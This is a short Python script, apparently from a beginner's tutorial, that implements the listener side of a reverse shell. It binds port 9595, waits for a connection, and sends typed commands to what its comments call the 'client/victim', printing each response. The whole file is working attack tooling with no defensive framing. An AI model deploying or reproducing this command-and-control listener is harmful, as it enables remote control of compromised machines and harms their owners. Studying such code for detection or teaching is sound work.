import socket
import sys

#creating the socket
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9595
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

#Bind the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " +str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Socket creation error: " + str(msg) + "\n" + "Retrying...")
        bind_socket()

#Establish the connection with the client
def socket_connect():
    conn, address = s.accept()
    print("Coonection has been established! |"+ "IP " + address[0] + "| Port " + str(address[1]))
    send_command(conn)
    conn.close()

#Send commands to the client/victim
def send_command(conn):
    while True: #To run an infinite loop
        cmd = input() #Input from the server
        if cmd == "quit":
            conn.close() #Close the connection
            s.close() #Close the socket
            sys.exit() #Exit from the command prompt
        if len(str.encode(cmd)) > 0: #Encoded the string to the byte formt
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8") #Recieve the byte format to string format
            print(client_response)
if __name__ == '__main__':
    create_socket()
    bind_socket()
    socket_connect()

